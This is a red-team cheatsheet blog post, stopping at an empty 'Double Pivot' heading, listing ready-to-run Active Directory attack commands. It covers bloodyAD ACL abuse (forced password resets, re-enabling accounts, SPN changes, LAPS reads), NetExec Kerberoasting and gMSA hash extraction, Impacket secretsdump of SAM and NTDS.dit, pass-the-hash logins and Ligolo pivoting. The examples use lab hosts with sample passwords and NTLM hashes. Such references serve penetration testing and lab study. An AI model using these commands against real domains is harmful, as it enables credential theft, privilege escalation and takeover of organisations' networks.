---
title: "Active Directory Cheatsheet"
date: 2025-09-15 00:00:00 +1000
categories: [active directory, cheatsheet, red team]
tags: [active directory, cheatsheet, red team]
---

This cheatsheets covers everything AD-related:
- Enumerating and exploiting DACLs, misconfigurations with bloodyAD
- Mapping network domains with BloodHound
- Authentication, enumeration, and credential dumping across various network services with NetExec
- Pivoting with ligolo - double, triple and quad pivots, accessing internal ports


### bloodyAD

bloodyAD is an Active Directory privilege escalation swiss army knife. bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

autobloodyAD: https://github.com/CravateRouge/autobloody

**Reset/Change a User’s Password (ForceChangePassword, AllExtendedRights)**

```bash
#Change the password for admin with john's permissions - john = ControlledUser - admin = User whose password we want to change
bloodyAD -u john -p 'NewPassword123!' -d $domain --host $IP set password admin 'NewPassword123!'
```

```bash
#Enumerate the attributes and ACLs of a specific group
 bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get object "CN=GROUP NAME,OU=Security Groups,OU=Corp,DC=ad,DC=trilocor,DC=local" --attr 
 distinguishedName,nTSecurityDescriptor --resolve-sd
```

Enumerate a user’s rights at the Domain Level

```bash
bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get object 'DC=ad,DC=trilocor,DC=local' --attr ntsecuritydescriptor --resolve-sd
```

Enumerate a user’s rights, permissions, and ACLs

```bash
#Enumerate a user's rights, permissions, ACLs
bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get writable --detail
```

**Read GMSA Password (ReadGMSAPassword)**

```bash
##Use the 'ReadGMSAPassword' privilege to get the NTLM hash
nxc ldap tombwatcher.htb -u user -p password --gmsa
```

**Deleted Objects - AD Tombstones**

```bash
#Query to find deleted objects from the AD tombstone
bloodyAD -u $user -p '$password' -d $domain --host $DC get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name --base 'CN=Deleted Objects,DC=ad,DC=trilocor,DC=local'
```

**Enable a Disabled Account**

```bash
bloodyAD -u $user -p '$password' -d $domain --host $DC remove uac $target_username -f ACCOUNTDISABLE
bloodyAD -u john.smith -p 'Password' -d htb.local --host dc01.htb.local remove uac joseph.smith -f ACCOUNTDISABLE
```

**Change a User’s SPN (for Targeted Kerberoasting)**

```bash
bloodyAD -d $domain --host $DC -u $user -p '$password' -k set object $user servicePrincipalName -v 'http/web.ad.trilocor.local'
```

**Search for LAPS Passwords (with GenericAll privilege)**

```bash
bloodyAD -u $user -p '$password' -d $domain --host $DC get search --filter '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))' --attr ms-MCS-AdmPwd --base 'ou=servers,dc=reflection,dc=vl'

ldapsearch -x -H ldap://10.10.151.149 -D "abbie.smith@reflection.vl" -w 'CMe1x+nlRaaWEw' -b 
"ou=servers,dc=reflection,dc=vl" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd
```

### netexec

**Kerberoasting / Targeted Kerberoasting**

```bash
nxc ldap IP -u user -p password --kerberoast kerberoast.out
```

**RBCD / GenericAll Exploitation without a Machine Account**

```bash
##Query Machine Account Quota (MAQ) - 0 = we CANNOT create computer objects
nxc ldap $dc -u $user -p $password -M maq
```

**Timeroasting**

```bash
nxc smb $domain -M timeroast
```

**Query LDAP**

```bash
nxc ldap <ip> -u username -p password --query "(sAMAccountName=Administrator)" ""
nxc ldap <ip> -u username -p password --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
#Get User Descriptions
nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users
```

**Find Misconfigured Delegation**

```bash
#Find Misconfigured Delegation
nxc ldap $IP-u $user -p $password --find-delegation

# Example Output

SMB    192.168.56.11   445   WINTERFELL   [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
LDAP   192.168.56.11   389   WINTERFELL   [+] north.sevenkingdoms.local\eddard.stark:FightP3aceAndHonor! (Pwn3d!)
LDAP   192.168.56.11   389   WINTERFELL   AccountName  AccountType DelegationType                     DelegationRightsTo
LDAP   192.168.56.11   389   WINTERFELL   ------------ ----------- ---------------------------------- ----------------------------------------------------------------
LDAP   192.168.56.11   389   WINTERFELL   sansa.stark  Person      Unconstrained                      N/A
LDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Constrained w/ Protocol Transition CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
LDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Resource-Based Constrained         RBCD-COMPUTER$
LDAP   192.168.56.11   389   WINTERFELL   CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
LDAP   192.168.56.11   389   WINTERFELL   пользователь Person      Resource-Based Constrained         WINTERFELL$
```

### Impacket

Get a TGT for a user

```bash
impacket-getTGT $domain/'user':'password'
impacket-getTGT htb.local/'john':'Password123'
```

Dump database

```bash
impacket-secretsdump DOMAIN/username:password@IP
#Dumping secrets with a hash
impacket-secretsdump htb.local/john@10.10.10.5 -hashes :aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
#Dump local SAM & SYSTEM files
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
#Dump local NTDS.dit (AD database)
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

Connecting to an MSSQL server

```bash
impacket-mssqlclient DOMAIN/username:password@IP
#Connecting to an MSSQL server with a hash
impacket-mssqlclient htb.local/john@10.10.10.5 -hashes :32ed87bdb5fdc5e9cba88547376818d4
```

### BloodHound

**Collection**

```bash
nxc ldap $domain -u $user -p $password --bloodhound --collection All --dns-server $IP

bloodhound-python -d $domain --zip -c All -ns $IP -u $user -p $password
```

### Pivoting with Ligolo

**Single Pivot**

```powershell
sudo ip tuntap add user $(whoami) mode tun ligolo #Add user
sudo ip link set ligolo up
```

**Single Pivot (same IP range)**

Pivoting when the target IP range is the same range as your IP (e.g both 10.10 range)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo #Add user
sudo ip link set ligolo up
sudo ip route add 10.10.146.86 via 10.8.5.207  #Add the machine IP (10.10.146.86) via your VPN IP (10.8.5.207)
sudo ip route add 10.10.146.80/28 dev ligolo   #Add a route between 10.10.146.80 to .95

```

**Port Forwarding**

If you need to access the local ports of the currently connected agents, there’s a “magic” CIDR hardcoded in Ligolo-ng: 240.0.0/4 (This is an unusual IPv4 subnet). If you query an IP address on this subnet, Ligolo-ng will automatically redirect traffic to the agent’s local IP address (127.0.0.1).

```bash
sudo ip route add 240.0.0.5/32 dev ligolo-portfwd
nmap -Pn 240.0.0.5 -p3306
```

**Double Pivot**
